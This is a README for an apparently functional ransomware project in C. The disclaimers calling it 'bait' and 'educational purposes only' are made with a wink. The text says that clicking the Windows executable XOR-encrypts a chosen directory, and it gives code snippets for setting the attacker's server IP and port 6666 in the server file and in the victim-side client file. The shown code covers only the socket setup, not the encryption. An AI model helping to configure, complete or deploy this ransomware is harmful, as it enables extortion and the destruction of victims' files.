# FinalMalware
it's bait, this is not a ransomware "gui単o" gui単o".

(developed for educational purposes only, "gui単o" "gui単o").

This ransomware works along with TCP sockets in C, basically if you have the executable file in your devie (Windows OS) and you clicked on it, some 
random (or not that random) directory specified in the script will be encrypted with XoR.

## Setups

### IP  of the server (your device, the hacker, cracker, wareva) and port to host the comunication in the 	[server.c ](https://github.com/Los-Hackers666/finalMalware/blob/main/server.c) file
```c
 server_addr.sin_family = AF_INET; // Declaring the type
 server_addr.sin_port = htons(6666); // Declaring the port number to listen on
 server_addr.sin_addr.s_addr = inet_addr("000.000.000.0"); // Declaring the host, your IP
 
 ```
 
 ### IP and port of the server in the victim script (must be the same as the previous step), declared in the 	[user.c](https://github.com/Los-Hackers666/finalMalware/blob/main/client.c) file
 
 ```c
 
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(6666);
    client_addr.sin_addr.s_addr = inet_addr("192.168.100.68");
 ```
